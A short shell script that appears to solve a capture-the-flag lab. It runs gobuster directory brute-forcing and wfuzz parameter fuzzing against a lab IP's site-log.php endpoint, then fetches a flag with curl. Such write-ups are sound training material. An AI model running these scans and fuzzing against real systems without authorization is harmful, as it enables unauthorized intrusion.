gobuster -u http://10.10.252.228/ -w big.txt -x php,txt,html;

wfuzz -c --hh 0 -z file,wordlist http://10.10.252.228/api/site-log.php?date=FUZZ;

flag=$(curl -s http://10.10.252.228/api/site-log.php?date=20201125);

echo "Flag: $flag";